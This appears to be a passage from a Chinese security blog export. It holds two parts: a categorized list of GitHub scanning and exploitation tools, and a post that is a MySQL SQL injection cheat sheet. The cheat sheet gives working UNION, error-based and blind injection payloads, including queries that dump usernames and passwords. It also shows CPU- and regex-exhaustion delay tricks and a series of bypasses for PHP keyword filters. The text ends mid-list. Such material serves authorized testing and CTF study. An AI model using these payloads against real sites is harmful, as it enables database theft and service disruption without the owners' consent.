https://github.com/0xbug/orangescan (提供web界面的在线子域名信息收集工具) https://github.com/TheRook/subbrute （高效精准的子域名爆破工具,同时也是扫描器中最常用的子域名API库) https://github.com/We5ter/GSDF (基于谷歌SSL透明证书的子域名查询脚本) https://github.com/mandatoryprogrammer/cloudflare_enum （使用CloudFlare进行子域名枚举的脚本） https://github.com/guelfoweb/knock (Knock子域名获取，可用于查找子域名接管漏洞) https://github.com/exp-db/PythonPool/tree/master/Tools/DomainSeeker （多方式收集目标子域名信息） https://github.com/code-scan/BroDomain (兄弟域名查询） https://github.com/chuhades/dnsbrute (高效的子域名爆破工具) https://github.com/yanxiu0614/subdomain3 (一款高效的子域名爆破工具） https://github.com/michenriksen/aquatone (子域名枚举、探测工具。可用于子域名接管漏洞探测) https://github.com/evilsocket/dnssearch (一款子域名爆破工具) https://github.com/reconned/domained (可用于子域名收集的一款工具） https://github.com/bit4woo/Teemo (域名收集及枚举工具) https://github.com/laramies/theHarvester (邮箱、服务器信息收集及子域名枚举工具） https://github.com/swisskyrepo/Subdomino (子域名枚举，端口扫描，服务存活确认） https://github.com/nmalcolm/Inventus (通过爬虫实现的子域名收集工具） https://github.com/aboul3la/Sublist3r (快速子域枚举工具) https://github.com/jonluca/Anubis （子域名枚举及信息搜集工具） https://github.com/n4xh4ck5/N4xD0rk (子域名查询工具) https://github.com/infosec-au/altdns (一款高效的子域名爆破工具) https://github.com/FeeiCN/ESD (基于AsyncIO协程以及非重复字典的子域名爆破工具) https://github.com/giovanifss/Dumb (快速而灵活的子域名爆破工具) https://github.com/UnaPibaGeek/ctfr (通过域名透明证书记录获取子域名) https://github.com/caffix/amass (Go语言开发的子域名枚举工具) https://github.com/Ice3man543/subfinder (继承于sublist3r项目的模块化体系结构，一个强劲的子域名枚举工具) 数据库类漏洞扫描器或爆破工具 https://github.com/0xbug/SQLiScanner (一款基于SQLMAP和Charles的被动SQL注入漏洞扫描工具) https://github.com/stamparm/DSSS (99行代码实现的sql注入漏洞扫描器) https://github.com/LoRexxar/Feigong （针对各种情况自由变化的MySQL注入脚本） https://github.com/youngyangyang04/NoSQLAttack (一款针对mongoDB的攻击工具) https://github.com/Neohapsis/bbqsql （SQL盲注利用框架） https://github.com/NetSPI/PowerUpSQL （攻击SQLSERVER的Powershell脚本框架） https://github.com/WhitewidowScanner/whitewidow (一款数据库扫描器) https://github.com/stampery/mongoaudit (MongoDB审计及渗透工具） https://github.com/torque59/Nosql-Exploitation-Framework (NoSQL扫描/爆破工具） https://github.com/missDronio/blindy (MySQL盲注爆破工具） https://github.com/fengxuangit/Fox-scan (基于SQLMAP的主动和被动资源发现的漏洞扫描工具） https://github.com/NetSPI/PowerUpSQL (用于SQL Server审计的powershell脚本） https://github.com/JohnTroony/Blisqy （用于http header中的时间盲注爆破工具，仅针对MySQL/MariaDB） https://github.com/ron190/jsql-injection (Java 编写的SQL注入工具) https://github.com/Hadesy2k/sqliv (基于搜索引擎的批量SQL注入漏洞扫描器） https://github.com/s0md3v/sqlmate (在sqlmap基础上增加了目录扫描、hash爆破等功能) https://github.com/m8r0wn/enumdb (MySQL以及MSSQL爆破脱裤工具） https://github.com/9tail123/wooscan (批量查询网站在乌云是否存在忽略的sql注入漏洞并自动调用sqlmap测试) 弱口令/弱用户名扫描器或爆破工具 https://github.com/lijiejie/htpwdScan (一个简单的HTTP暴力破解、撞库攻击脚本) https://github.com/ysrc/F-Scrack （对各类服务进行弱口令检测的脚本) https://github.com/Mebus/cupp （根据用户习惯生成弱口令探测字典脚本） https://github.com/netxfly/crack_ssh （Go写的协程版的ssh\redis\mongodb弱口令破解工具） https://github.com/LandGrey/pydictor (暴力破解字典建立工具) https://github.com/shengqi158/weak_password_detect (多线程探测弱口令） https://github.com/s0md3v/Blazy (支持测试 CSRF, Clickjacking, Cloudflare and WAF的弱口令探测器） https://github.com/MooseDojo/myBFF (对CiscoVPN、Citrix Gateway等各类服务进行弱口令检测的脚本) 物联网设备识别工具或扫描器 https://github.com/rapid7/IoTSeeker （物联网设备默认密码扫描检测工具) https://github.com/shodan-labs/iotdb (使用nmap扫描IoT设备) https://github.com/googleinurl/RouterHunterBR （路由器设备漏洞扫描利用) https://github.com/scu-igroup/telnet-scanner (Telnet服务密码撞库) https://github.com/viraintel/OWASP-Nettacker (自动化信息搜集及渗透测试工具，比较适用于IoT扫描) https://github.com/threat9/routersploit (嵌入式设备漏洞扫描及利用工具) 反射型或DOM-Based XSS扫描器 https://github.com/shawarkhanethicalhacker/BruteXSS （一款XSS扫描器,可暴力注入参数） https://github.com/1N3/XSSTracer (小型XSS扫描器,也可检测CRLF、XSS、点击劫持的) https://github.com/0x584A/fuzzXssPHP (PHP版本的反射型xss扫描) https://github.com/chuhades/xss_scan (批量扫描XSS的python脚本） https://github.com/BlackHole1/autoFindXssAndCsrf (自动化检测页面是否存在XSS和CSRF漏洞的浏览器插件） https://github.com/shogunlab/shuriken (使用命令行进行XSS批量检测) https://github.com/s0md3v/XSStrike (可识别并绕过WAF的XSS扫描工具) https://github.com/stamparm/DSXS (支持GET、POST方式的高效XSS扫描器） 企业资产管理或信息泄露搜集工具 https://github.com/ysrc/xunfeng (网络资产识别引擎，漏洞检测引擎） https://github.com/laramies/theHarvester （企业被搜索引擎收录敏感资产信息监控脚本：员工邮箱、子域名、Hosts） https://github.com/x0day/Multisearch-v2 (Bing、google、360、zoomeye等搜索引擎聚合搜索，可用于发现企业被搜索引擎收录的敏感资产信息） https://github.com/Ekultek/Zeus-Scanner (集成化的综合搜索引擎，能够抓取被搜索引擎隐藏的url,并交由sqlmap、nmap扫描） https://github.com/0xbug/Biu-framework (企业内网基础服务安全扫描框架) https://github.com/metac0rtex/GitHarvester (github Repo信息搜集工具) https://github.com/shengqi158/svnhack （.svn文件夹泄漏利用工具） https://github.com/repoog/GitPrey (GitHub敏感信息扫描工具) https://github.com/0xbug/Hawkeye (企业资产、敏感信息GitHub泄露监控系统） https://github.com/lianfeng30/githubscan （根据企业关键词进行项目检索以及相应敏感文件和文件内容扫描的工具） https://github.com/UnkL4b/GitMiner （github敏感信息搜索工具） https://github.com/lijiejie/GitHack (.git文件夹泄漏利用工具) https://github.com/dxa4481/truffleHog (GitHub敏感信息扫描工具,包括检测commit等) https://github.com/1N3/Goohak （自动化对指定域名进行Google hacking搜索并收集信息） https://github.com/UKHomeOffice/repo-security-scanner (用于搜索git commit中的敏感信息，例如密码、私钥等的客户端工具) https://github.com/FeeiCN/GSIL (Github敏感信息泄露扫描) https://github.com/MiSecurity/x-patrol (Github泄露巡航工具) https://github.com/1N3/BlackWidow (Web站点信息搜集工具，包括邮箱、电话等信息） https://github.com/anshumanbh/git-all-secrets (集合多个开源GitHub敏感信息扫描的企业信息泄露巡航工具) https://github.com/s0md3v/Photon (可以提取网址，电子邮件，文件，网站帐户等的高速爬虫) https://github.com/VKSRC/Github-Monitor (由vipkid SRC开发的Github信息泄漏监控系统) webshell检测或木马分析工具 https://github.com/he1m4n6a/findWebshell （一款简单的webshell检测工具) https://github.com/Tencent/HaboMalHunter （哈勃分析系统，linux系统病毒分析及安全检测） https://github.com/PlagueScanner/PlagueScanner (使用python实现的集成ClamAV、ESET、Bitdefender的反病毒引擎) https://github.com/nbs-system/php-malware-finder (一款高效率PHP-webshell扫描工具) https://github.com/emposha/PHP-Shell-Detector/ (测试效率高达99%的webshell检测工具) https://github.com/erevus-cn/scan_webshell (一款简洁的Webshell扫描工具） https://github.com/emposha/Shell-Detector （Webshell扫描工具，支持php/perl/asp/aspx webshell扫描) https://github.com/m4rco-/dorothy2 (一款木马、僵尸网络分析框架） https://github.com/droidefense/engine (高级安卓木马病毒分析框架） 内网渗透或扫描工具 https://github.com/lcatro/network_backdoor_scanner （基于网络流量的内网探测框架） https://github.com/fdiskyou/hunter （调用 Windows API 枚举用户登录信息） https://github.com/BlackHole1/WebRtcXSS （自动化利用XSS入侵内网） 中间件扫描器或指纹识别工具 https://github.com/ring04h/wyportmap (目标端口扫描+系统服务指纹识别) https://github.com/ring04h/weakfilescan (动态多线程敏感信息泄露检测工具) https://github.com/EnableSecurity/wafw00f (WAF产品指纹识别) https://github.com/rbsec/sslscan （SSL类型识别) https://github.com/urbanadventurer/whatweb (Web指纹识别) https://github.com/tanjiti/FingerPrint (Web应用指纹识别) https://github.com/nanshihui/Scan-T （网络爬虫式指纹识别) https://github.com/OffensivePython/Nscan (基于Masscan和Zmap的网络扫描器) https://github.com/ywolf/F-NAScan (网络资产信息扫描, ICMP存活探测,端口扫描，端口指纹服务识别） https://github.com/ywolf/F-MiddlewareScan （中间件扫描） https://github.com/maurosoria/dirsearch (web路径收集与扫描) https://github.com/x0day/bannerscan （C段Banner与路径扫描） https://github.com/RASSec/RASscan (端口服务扫描) https://github.com/3xp10it/bypass_waf （waf自动暴破） https://github.com/3xp10it/xcdn (尝试找出cdn背后的真实ip) https://github.com/Xyntax/BingC （基于Bing搜索引擎的C段/旁站查询，多线程，支持API） https://github.com/Xyntax/DirBrute （多线程WEB目录爆破工具） https://github.com/zer0h/httpscan （一个爬虫式的网段Web主机发现小工具） https://github.com/lietdai/doom （Thorn上实现的分布式任务分发的ip端口漏洞扫描器） https://github.com/chichou/grab.js (类似 zgrab 的快速 TCP 指纹抓取解析工具，支持更多协议) https://github.com/Nitr4x/whichCDN (CDN识别、检测） https://github.com/secfree/bcrpscan (基于爬虫的web路径扫描器) https://github.com/mozilla/ssh_scan (服务器ssh配置信息扫描） https://github.com/18F/domain-scan (针对域名及其子域名的资产数据检测／扫描，包括http/https检测等） https://github.com/ggusoft/inforfinder (域名资产收集及指纹识别工具） https://github.com/boy-hack/gwhatweb (CMS识别 python gevent实现) https://github.com/Mosuan/FileScan (敏感文件扫描 / 二次判断降低误报率 / 扫描内容规则化 / 多目录扫描) https://github.com/Xyntax/FileSensor (基于爬虫的动态敏感文件探测工具) https://github.com/deibit/cansina (web路径扫描工具） https://github.com/0xbug/Howl (网络设备 web 服务指纹扫描与检索) https://github.com/mozilla/cipherscan (目标主机服务ssl类型识别) https://github.com/xmendez/wfuzz (Web应用fuzz工具、框架，同时可用于web路径/服务扫描） https://github.com/s0md3v/Breacher (多线程的后台路径扫描器，也可用于发现Execution After Redirect漏洞） https://github.com/ztgrace/changeme (弱口令扫描器，不仅支持普通登录页，也支持ssh、mongodb等组件） https://github.com/medbenali/CyberScan (渗透测试辅助工具，支持分析数据包、解码、端口扫描、IP地址分析等） https://github.com/m0nad/HellRaiser (基于nmap的扫描器，与cve漏洞关联） https://github.com/scipag/vulscan (基于nmap的高级漏洞扫描器，命令行环境使用） https://github.com/jekyc/wig (web应用信息搜集工具） https://github.com/eldraco/domain_analyzer (围绕web服务的域名进行信息收集和”域传送”等漏洞扫描，也支持针对背后的服务器端口扫描等） https://github.com/cloudtracer/paskto (基于Nikto扫描规则的被动式路径扫描以及信息爬虫） https://github.com/zerokeeper/WebEye (快速识别WEB服务器类型、CMS类型、WAF类型、WHOIS信息、以及语言框架) https://github.com/m3liot/shcheck (用于检查web服务的http header的安全性) https://github.com/aipengjie/sensitivefilescan (一款高效快捷的敏感文件扫描工具） https://github.com/fnk0c/cangibrina (通过字典穷举、google、robots.txt等途径的跨平台后台管理路径扫描器） https://github.com/n4xh4ck5/CMSsc4n (常规CMS指纹识别） https://github.com/Ekultek/WhatWaf （WAF指纹识别及自动化bypass工具） https://github.com/dzonerzy/goWAPT (Web应用fuzz工具、框架，同时可用于web路径/服务扫描) https://github.com/blackye/webdirdig (web敏感目录/信息泄漏扫描脚本) https://github.com/GitHackTools/BillCipher (用于网站或IP地址的信息收集工具) https://github.com/boy-hack/w8fuckcdn (通过扫描全网获得真实IP的自动化程序) https://github.com/boy-hack/w11scan (分布式WEB指纹识别平台) https://github.com/Nekmo/dirhunt (爬虫式web目录扫描工具) https://github.com/MetaChar/pyHAWK (数据库文件、私钥等敏感文件泄露扫描) 专用（即特定性针对某些组件）扫描器 https://github.com/blackye/Jenkins (Jenkins漏洞探测、用户抓取爆破) https://github.com/code-scan/dzscan (首款集成化的Discuz扫描工具) https://github.com/chuhades/CMS-Exploit-Framework (一款简洁优雅的CMS扫描利用框架) https://github.com/lijiejie/IIS_shortname_Scanner （IIS短文件名暴力枚举漏洞利用工具) https://github.com/riusksk/FlashScanner (flashxss扫描) https://github.com/coffeehb/SSTIF （一个Fuzzing服务器端模板注入漏洞的半自动化工具） https://github.com/epinna/tplmap (服务器端模板注入漏洞检测与利用工具) https://github.com/cr0hn/dockerscan (Docker扫描工具) https://github.com/m4ll0k/WPSeku (一款精简的wordpress扫描工具) https://github.com/rastating/wordpress-exploit-framework (集成化wordpress漏洞利用框架) https://github.com/ilmila/J2EEScan (用于扫描J2EE应用的一款burpsuite插件) https://github.com/riusksk/StrutScan (一款基于perl的strut2的历史漏洞扫描器) https://github.com/D35m0nd142/LFISuite (本地文件包含漏洞利用及扫描工具，支持反弹shell) https://github.com/0x4D31/salt-scanner (基于Salt Open以及Vulners Linux Audit API的linux漏洞扫描器，支持与JIRA、slack平台结合使用) https://github.com/tijme/angularjs-csti-scanner (自动化探测客户端AngularJS模板注入漏洞工具) https://github.com/irsdl/IIS-ShortName-Scanner (Java编写的IIS短文件名暴力枚举漏洞利用工具) https://github.com/swisskyrepo/Wordpresscan (基于WPScan以及WPSeku的优化版wordpress扫描器) https://github.com/CHYbeta/cmsPoc (CMS渗透测试框架） https://github.com/rudSarkar/crlf-injector (CRLF注入漏洞批量扫描） https://github.com/3gstudent/Smbtouch-Scanner (自动化扫描内网中存在的由shadow brokers泄露的ETERNAL系列漏洞) https://github.com/utiso/dorkbot （通过定制化的谷歌搜索引擎进行漏洞页面搜寻及扫描） https://github.com/OsandaMalith/LFiFreak （本地文件包含漏洞利用及扫描工具，支持反弹shell) https://github.com/mak-/parameth (用于枚举脚本的GET/POST未知参数字段） https://github.com/Lucifer1993/struts-scan (struts2漏洞全版本检测和利用工具) https://github.com/hahwul/a2sv (SSL漏洞扫描，例如心脏滴血漏洞等） https://github.com/NullArray/DorkNet (基于搜索引擎的漏洞网页搜寻） https://github.com/NickstaDB/BaRMIe (用于攻击爆破Java Remote Method Invocation服务的工具) https://github.com/RetireJS/grunt-retire (扫描js扩展库的常见漏洞） https://github.com/kotobukki/BDA (针对hadoop/spark等大数据平台的的漏洞探测工具） https://github.com/jagracey/Regex-DoS (RegEx 拒绝服务扫描器) https://github.com/milesrichardson/docker-onion-nmap (使用nmap扫描Tor网络上隐藏的”onion”服务) https://github.com/Moham3dRiahi/XAttacker (Web CMS Exploit 工具,包含针对主流 CMS 的 66 个不同的 Exploits) https://github.com/lijiejie/BBScan (一个迷你的信息泄漏批量扫描脚本) https://github.com/almandin/fuxploider (文件上传漏洞扫描器及利用工具） https://github.com/Ice3man543/SubOver (子域名接管漏洞检测工具，支持30+云服务托管检测) https://github.com/Jamalc0m/wphunter (Wordpress漏洞扫描器,同时也支持敏感文件泄露扫描) https://github.com/retirejs/retire.js (检测网站依赖的JavaScript库中存在的已知通用漏洞) https://github.com/3xp10it/xupload (自动检测上传功能是否可上传webshell) https://github.com/mobrine-mob/M0B-tool （CMS指纹识别及自动化渗透测试框架） https://github.com/rezasp/vbscan (论坛框架vBulletin黑盒漏洞扫描器) https://github.com/MrSqar-Ye/BadMod (CMS指纹识别及自动化渗透测试框架) https://github.com/Tuhinshubhra/CMSeeK (CMS漏洞检测和利用套件) https://github.com/cloudsploit/scans (AWS安全审计工具) https://github.com/radenvodka/SVScanner (针对wp、magento、joomla等CMS的漏洞扫描器及自动利用工具) https://github.com/rezasp/joomscan (OWASP旗下joomla漏洞扫描项目) https://github.com/6IX7ine/djangohunter (用于检测因错误配置导致敏感信息暴露的Django应用程序) 无线网络（审计）扫描器 https://github.com/savio-code/fern-wifi-cracker/ (无线安全审计工具) https://github.com/m4n3dw0lf/PytheM （Python网络/渗透测试工具） https://github.com/P0cL4bs/WiFi-Pumpkin （无线安全渗透测试套件） https://github.com/MisterBianco/BoopSuite (无线网络审计工具，支持2-5GHZ频段） https://github.com/DanMcInerney/LANs.py (ARP欺骗，无线网络劫持） https://github.com/besimaltnok/PiFinger (检查wifi是否是”大菠萝”所开放的热点，并给予网络评分） https://github.com/derv82/wifite2 （自动化无线网络攻击工具wifite的重构版本） 局域网络（本地网络）扫描器 https://github.com/sowish/LNScan (基于BBScan via.lijiejie的本地网络扫描) https://github.com/niloofarkheirkhah/nili （网络扫描，中间人攻击，协议检测与逆向） https://github.com/SkyLined/LocalNetworkScanner （基于javascript的本地网络扫描) 代码审计工具或扫描器 https://github.com/wufeifei/cobra (白盒代码安全审计系统) https://github.com/OneSourceCat/phpvulhunter (静态PHP代码审计) https://github.com/Qihoo360/phptrace (跟踪、分析PHP运行情况的工具） https://github.com/ajinabraham/NodeJsScan (NodeJS应用代码审计） https://github.com/shengqi158/pyvulhunter （Python应用审计） https://github.com/presidentbeef/brakeman ( Ruby on Rails应用静态代码分析） https://github.com/python-security/pyt (Python应用静态代码审计） https://github.com/m4ll0k/WPSploit (Wordpress插件代码安全审计） https://github.com/emanuil/php-reaper (用于扫描PHP应用程序中可能存在SQL漏洞的ADOdb代码） https://github.com/lowjoel/phortress (用于检测潜在安全漏洞的PHP静态代码分析工具） 模块化设计扫描器或漏洞检测框架 https://github.com/az0ne/AZScanner (自动漏洞扫描器，子域名爆破，端口扫描，目录爆破，常用框架漏洞检测) https://github.com/blackye/lalascan (集合owasp top10漏洞扫描和边界资产发现能力的分布式web漏洞扫描框架) https://github.com/blackye/BkScanner (BkScanner 分布式、插件化web漏洞扫描器) https://github.com/ysrc/GourdScanV2 （ysrc出品的被动式漏洞扫描工具) https://github.com/netxfly/passive_scan (基于http代理的web漏洞扫描器) https://github.com/1N3/Sn1per (自动化扫描器，包括中间件扫描以及设备指纹识别) https://github.com/RASSec/pentestEr_Fully-automatic-scanner （定向全自动化渗透测试工具） https://github.com/3xp10it/3xp10it （自动化渗透测试框架，支持cdn真实ip查找、指纹识别等) https://github.com/Lcys/lcyscan (python插件化漏洞扫描器，支持生成扫描报表） https://github.com/Xyntax/POC-T （渗透测试插件化并发框架） https://github.com/v3n0m-Scanner/V3n0M-Scanner （支持检测SQLi/XSS/LFI/RFI等漏洞的扫描器） https://github.com/Skycrab/leakScan （Web图形化的的漏洞扫描框架） https://github.com/zhangzhenfeng/AnyScan (一款web化的自动化渗透测试框架) https://github.com/Tuhinshubhra/RED_HAWK (一款集成信息收集、漏洞扫描、指纹识别等的多合一扫描工具） https://github.com/Arachni/arachni (高度集成化的Web应用漏洞扫描框架，支持REST、RPC等api调用） https://github.com/infobyte/faraday （集成化渗透测试辅助平台及漏洞管理平台） https://github.com/juansacco/exploitpack (渗透测试集成框架，包含超过38,000+ exploits) https://github.com/swisskyrepo/DamnWebScanner （基于chrome/opera插件的被动式漏洞扫描） https://github.com/anilbaranyelken/tulpar (支持多种web漏洞扫描，命令行环境使用） https://github.com/m4ll0k/Spaghetti (web应用扫描器，支持指纹识别、文件目录爆破、SQL/XSS/RFI等漏洞扫描，也可直接用于struts、ShellShock等扫描) https://github.com/Yukinoshita47/Yuki-Chan-The-Auto-Pentest (集成子域名枚举、nmap、waf指纹识别等模块的web应用扫描器） https://github.com/0xsauby/yasuo (使用ruby开发的扫描网络中主机存在的第三方web应用服务漏洞） https://github.com/hatRiot/clusterd (Web应用自动化扫描框架,支持自动化上传webshell) https://github.com/erevus-cn/pocscan （一款开源 Poc 调用框架,可轻松调用Pocsuite,Tangscan,Beebeeto,Knowsec老版本POC，可使用docker部署） https://github.com/TophantTechnology/osprey (斗象能力中心出品并长期维护的开源漏洞检测框架) https://github.com/yangbh/Hammer (Web应用漏洞扫描框架) https://github.com/Lucifer1993/AngelSword (Web应用漏洞扫描框架,基于python3) https://github.com/secrary/EllaScanner (被动式漏洞扫描，支持历史cve编号漏洞识别) https://github.com/zaproxy/zaproxy (The OWASP ZAP core project出品的综合性渗透测试工具） https://github.com/sullo/nikto (Web服务综合型扫描器，用于指定目标的资产收集、安全配置缺陷或者安全漏洞扫描） https://github.com/s0md3v/Striker (一款多方位信息收集、指纹识别及漏洞扫描工具） https://github.com/dermotblair/webvulscan (一款web应用漏洞扫描器，支持扫描反射型以及存储型xss、sql injection等漏洞，支持输出pdf报告) https://github.com/alienwithin/OWASP-mth3l3m3nt-framework (渗透测试辅助工具，综合利用框架） https://github.com/toyakula/luna (基于被动式扫描框架的自动化web漏洞扫描工具） https://github.com/Manisso/fsociety (渗透测试辅助框架，包含信息搜集、无线渗透、web应用扫描等功能) https://github.com/boy-hack/w9scan (内置1200+插件的web漏洞扫描框架) https://github.com/YalcinYolalan/WSSAT (Web服务安全评估工具,提供基于windows操作系统的简单.exe应用) https://github.com/AmyangXYZ/AssassinGo (使用Go开发的可扩展以及高并发渗透测试框架) https://github.com/jeffzh3ng/InsectsAwake (基于 Flask 应用框架的漏洞扫描系统) https://github.com/m4ll0k/Galileo (一个操作上类似metasploit的web应用安全审计框架) https://github.com/joker25000/Optiva-Framework (一款web应用漏洞扫描器，支持扫描反射型以及存储型xss、sql injection等漏洞) https://github.com/theInfectedDrake/TIDoS-Framework (集成104个模块的Web应用程序渗透测试框架) https://github.com/TideSec/WDScanner (一款功能完备的企业级漏洞扫描器) 高级持续性威胁(APT)相关工具 https://github.com/Neo23x0/Loki (一款APT入侵痕迹扫描器) 工控系统&amp;大型网络相关安全工具 https://github.com/w3h/icsmaster/tree/master/nse （ICS设备nmap扫描脚本) https://github.com/OpenNetworkingFoundation/DELTA （SDN安全评估框架） **转自**：https://github.com/We5ter/Scanners-Box]]></content>
      <categories>
        <category>Other</category>
      </categories>
      <tags>
        <tag>Other</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入一把梭]]></title>
    <url>%2F2019%2F06%2F07%2FSQL%E6%B3%A8%E5%85%A5%E4%B8%80%E6%8A%8A%E6%A2%AD%2F</url>
    <content type="text"><![CDATA[SQL注入手册… Mysql一把梭常用命令一把梭一些基本信息 MySQL版本 version() 当前用户名 user() 数据库名 database() 数据库路径 @@datadir 操作系统版本 @@version_compile_os 安装 MySQL 的安装路径 @@basedir UNION注入一把梭UNION注入 注意：Mysql要大于5.0 找到注入点后获取字段数 1order by num 查看哪些地方有字段的回显 1id=-1 UNION SELECT 1,2...,n 获取系统数据库名 1select null,null,schema_name from information_schema.schemata 直接获取当前数据库名 1select null,null,...,database() 获取数据库中的表 1select null,null,...,group_concat(table_name) from information_schema.tables where table_schema=database() 获取表中的字段 1select null,null,...,group_concat(column_name) from information_schema.columns where table_schema=database() and tadble_name='&lt;你取得的表名&gt;' 获取各个字段值 1select null,group_concat(&lt;获取到的字段1&gt;,&lt;获取到的字段2&gt;) from &lt;当前表名&gt; UNION + JOIN 注入 适用于：逗号被过滤 1union SELECT * FROM (SELECT 1)a JOIN (SELECT 1)b JOIN (SELECT database())c; 报错注入一把梭 若有报错信息则选择报错注入 UpdateXml(有长度限制,最长32位) 1id=1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) 如果concat被过滤了，可以使用MAKE_SET函数 ExtractValue(有长度限制,最长32位) 1id=1 and extractvalue(1, concat(0x7e, (select @@version),0x7e)) 如果concat被过滤了，可以使用MAKE_SET函数 exp(5.5.5以上) 1234567891011121314普通查询select exp(~(select*from(select user())x));得到表名：select exp(~(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x));得到列名：select exp(~(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x));检索数据：select exp(~ (select*from(select concat_ws(':',id, username, password) from users limit 0,1)x)); mysql&gt;5.5.53时，则不能返回查询结果 floor(需要三个函数支持) 1Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a; count(*)、rand()、group by三者缺一不可 floor完整的注入流程 其余报错 1234567891011121314151617181920212223GeometryCollection()id = 1 AND GeometryCollection((select * from (select * from(select user())a)b))polygon()id =1 AND polygon((select * from(select * from(select user())a)b))multipoint()id = 1 AND multipoint((select * from(select * from(select user())a)b))multilinestring()id = 1 AND multilinestring((select * from(select * from(select user())a)b))linestring()id = 1 AND LINESTRING((select * from(select * from(select user())a)b))multipolygon()id =1 AND multipolygon((select * from(select * from(select user())a)b)) 都不怎么好用 时间，布尔盲注一把梭时间sleep 1If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 if判断语句，条件为假，执行sleep BENCHMARK 1BENCHMARK(count,expr) 在运行过程中占用大量的cpu资源 笛卡尔积 1' and if(ascii(substr((select database()),%d,1))&lt;%d,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B,information_schema.tables C),1)# 查询数据量极大的表造成延时。 不正确正则 1select if(substr((select 1)='1',1,1),concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',1); 布尔123456789101112131415161718left(user(),1)&gt;'r' right(user(),1)&gt;'r' substr(user(),1,1)='r' mid(user(),1,1)='r' greatest("sed",database())= "sed" //返回最大值再与字符串比较select least("sea",database())="sea"; //返回最小值再与字符串比较 //不使用逗号 user() regexp '^[a-z]'user() like 'root%' //注意_/%通配符，建议写脚本的时候时候写到字符集最后面POSITION('root' in user())mid(user() from 1 for 1)='r'mid(user() from 1)='r'substr(user() from 1 for 1)='r'substr(user() from 1)='r'ASCII()、ORD()和CHAR()函数一般用做辅助。 Bypass一把梭过滤空格两个空格代替一个空格，用Tab代替空格，注释代替空格 12%20 %09 %0a %0b %0c %0d %a0 %00 /**/ /*!*/ 括号绕过空格 1id=1'and(sleep(ascii(substr(database(),1,1))=109)) # 空格被过滤，括号没有被过滤，可以用括号绕过 过滤逗号盲注（substr(),mid(),limit） 12345select substr(database() from 1 for 1);select mid(database() from 1 for 1);//对于limit可以使用offset来绕过limit 0,1 等价于 limit 1 offset 0 直接替换为like注入 1select user() like 'ro%' 注意通配符 % union + join注入 123union select 1,2 #等价于union select * from (select 1)a join (select 2)b 过滤比较符号过滤了等号 123456789原代码：select * from users where id =1regexp: select * from users where id REGEXP '^1$'!&lt;&gt;: select * from users where !(id&lt;&gt;1)in: select 'user' in ('user'); 字符串都是可以用16进制代替的. 用函数绕过: strcmp(),locate(s1,s) , position(s1 in s) , instr(s,s1), greatest() 过滤了大于小于 1234greatest(a,b)，返回a和b中较大的那个数。select * from users where id=1 and ord(mid(database(),0,1))&gt;1等价select * from users where id=1 and greatest(ord(mid(database(),0,1)),123)=123 过滤了ifcase…when…then…else来代替 1234select * from users where id=1 and if(1=1,sleep(5),0)等价于：select * from users where id=1 and case when 1=1 then sleep(5) else 0 end 常见Bypass PHP中一些常见的过滤方法及绕过方式 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859过滤关键字 and orphp代码 preg_match('/(and|or)/i',$id)会过滤的攻击代码 1 or 1=1 1 and 1=1绕过方式 1 || 1=1 1 &amp;&amp; 1=1过滤关键字 and or unionphp代码 preg_match('/(and|or|union)/i',$id)会过滤的攻击代码 union select user,password from users绕过方式 1 &amp;&amp; (select user from users where userid=1)='admin'过滤关键字 and or union wherephp代码 preg_match('/(and|or|union|where)/i',$id)会过滤的攻击代码 1 &amp;&amp; (select user from users where user_id = 1) = 'admin'绕过方式 1 &amp;&amp; (select user from users limit 1) = 'admin'过滤关键字 and or union wherephp代码 preg_match('/(and|or|union|where)/i',$id)会过滤的攻击代码 1 &amp;&amp; (select user from users where user_id = 1) = 'admin'绕过方式 1 &amp;&amp; (select user from users limit 1) = 'admin'过滤关键字 and, or, union, where, limitphp代码 preg_match('/(and|or|union|where|limit)/i', $id)会过滤的攻击代码 1 &amp;&amp; (select user from users limit 1) = 'admin'绕过方式 1 &amp;&amp; (select user from users group by user_id having user_id = 1) = 'admin'#user_id聚合中user_id为1的user为admin过滤关键字 and, or, union, where, limit, group byphp代码 preg_match('/(and|or|union|where|limit|group by)/i', $id)会过滤的攻击代码 1 &amp;&amp; (select user from users group by user_id having user_id = 1) = 'admin'绕过方式 1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) = 1过滤关键字 and, or, union, where, limit, group by, selectphp代码 preg_match('/(and|or|union|where|limit|group by|select)/i', $id)会过滤的攻击代码 1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) = 1绕过方式 1 &amp;&amp; substr(user,1,1) = 'a'过滤关键字 and, or, union, where, limit, group by, select, 'php代码 preg_match('/(and|or|union|where|limit|group by|select|\')/i', $id)会过滤的攻击代码 1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) = 1绕过方式 1 &amp;&amp; user_id is not null 1 &amp;&amp; substr(user,1,1) = 0x61 1 &amp;&amp; substr(user,1,1) = unhex(61)过滤关键字 and, or, union, where, limit, group by, select, ', hexphp代码 preg_match('/(and|or|union|where|limit|group by|select|\'|hex)/i', $id)会过滤的攻击代码 1 &amp;&amp; substr(user,1,1) = unhex(61)绕过方式 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。过滤关键字 and, or, union, where, limit, group by, select, ', hex, substrphp代码 preg_match('/(and|or|union|where|limit|group by|select|\'|hex|substr)/i', $id)会过滤的攻击代码 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16))/td&gt;绕过方式 1 &amp;&amp; lpad(user,7,1)过滤关键字 and, or, union, where, 